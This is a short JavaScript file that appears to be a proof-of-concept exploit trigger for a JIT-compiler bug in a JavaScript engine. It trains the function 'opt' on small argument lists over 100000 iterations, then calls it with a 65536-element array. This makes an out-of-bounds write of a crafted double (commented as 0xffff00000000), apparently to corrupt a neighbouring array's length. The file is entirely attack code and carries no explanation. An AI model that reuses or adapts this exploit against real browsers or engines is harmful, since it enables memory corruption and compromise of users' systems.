function opt(arg) {
  let x = arguments.length;
  a1 = new Array(0x10);
  a2 = new Array(2); a2[0] = 1.1; a2[1] = 1.1;
  a1[(x >> 16) * 0xf00000] = 1.39064994160909e-309; // 0xffff00000000
}

var a1, a2;

let small = [1.1];
let large = [1.1,1.1];
large.length = 65536;
large.fill(1.1);

for (let j = 0; j< 100000; j++) {
    opt.apply(null, small);
}

opt.apply(null, large);
